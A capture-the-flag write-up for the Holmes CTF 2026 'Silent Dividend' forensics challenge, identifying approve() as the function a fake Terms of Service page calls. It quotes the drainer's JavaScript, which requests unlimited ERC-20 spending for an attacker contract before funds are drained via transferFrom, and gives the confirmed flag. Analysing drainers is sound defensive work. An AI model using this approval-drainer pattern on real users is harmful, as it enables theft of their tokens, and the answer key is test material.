# SilentDividend Q7 — Finding `approve()`

**Challenge:** Holmes CTF 2026 — Sherlock 01 / Silent Dividend  
**Question:** What token function does the HTML page call to request spending permission?  
**UI type:** `(function())`  
**Answer (confirmed):** `approve()`  
**Format:** bare function **with parentheses** — no `HTB{}` wrap

---

## What the question is asking

The “Terms of Service” page is a **crypto drainer**. After the wallet connects, the page asks the **ERC-20 token** for **spend permission** for the attacker contract. That call is token **`approve`**.

UI type `(function())` → submit **`approve()`**, not bare `approve`.

---

## Attack path

### 1. Open the drainer HTML

`asar/src/settlement.html` (also present under installer `src/`).

### 2. Find the token ABI + the call

```javascript
const X0_CONTRACT_ADDRESS = "0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D";
const MOCK_TOKEN_ADDRESS  = "0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2";

const MOCK_TOKEN_ABI = [
    {
        "name": "approve",
        "inputs": [
            {"internalType": "address", "name": "spender", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    // balanceOf, mint ...
];

async function requestApproval() {
    const token = new ethers.Contract(MOCK_TOKEN_ADDRESS, MOCK_TOKEN_ABI, signer);
    const unlimitedAmount = ethers.MaxUint256;  // Q8
    const tx = await token.approve(X0_CONTRACT_ADDRESS, unlimitedAmount);
    await tx.wait();
}
```

| Question focus | Answer |
|----------------|--------|
| Token function for spend permission | **`approve()`** |
| JS wrapper name | `requestApproval` — **not** the token function |
| Amount | `MaxUint256` decimal — Q8 |

### 3. Optional chain check

`wallet.sol` / `MockToken.approve(spender, amount)` sets `allowance[msg.sender][spender]`.  
Drainer `x11` later `transferFrom`s using that allowance.

### 4. Submit (confirmed)

```text
approve()
```

If a variant asked for the Solidity signature: `approve(address,uint256)`.  
**This challenge accepted `approve()`.**

---

## Team checklist

- [ ] Evidence = `settlement.html`, not preload.
- [ ] Token ABI function = `approve`; call = `token.approve(...)`.
- [ ] Submit **`approve()`** with parentheses.
- [ ] Pair with Q8 (amount) and Q9 (`BrowserProvider`) in the same script block.

---

## One-line brief

> ToS page requests unlimited ERC-20 spend via `token.approve(drainer, MaxUint256)` — submit `approve()`.

---

*Confirmed flag.*
